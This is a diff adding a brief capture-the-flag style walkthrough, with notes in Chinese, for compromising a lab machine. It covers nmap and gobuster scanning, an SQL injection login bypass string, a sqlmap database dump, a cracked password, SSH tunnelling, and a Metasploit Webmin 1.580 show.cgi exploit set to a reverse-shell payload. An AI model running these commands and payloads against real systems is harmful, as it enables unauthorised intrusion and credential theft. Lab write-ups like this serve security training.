@@ -1,0 +1,20 @@
+nmap -sC -sV -Pn 10.10.242.169 > nmap.txt
+nmap -p- 10.10.242.169 > nmapall.txt
+gobuster dir  -u http://10.10.242.169/ -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+
+
+1.SQL Injection bypass可以登入
+admin' or 1=1#
+2.登入後將搜索請求的post存成txt
+sqlmap -r request.txt --dbms=mysql --dump
+3.可以看到將密碼存在暫存檔案
+/tmp/sqlmap9vmjbm6p10046/sqlmaphashes-zqqy8u4c.txt
+4.hashes.com可以破解出來videogamer124
+5.使用ssh做tunel訪問1000端口
+ssh -L10000:localhost:10000 agent47@10.10.242.169
+6.webmin帳密是默認用戶的帳密,可以直接登入
+7.發現webmin版本是1.580
+8.searchsploit可以找到漏洞
+Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)
+9.msfconsole根據webmin使用show.cgi exploit指令payload
+set payload cmd/unix/reverse
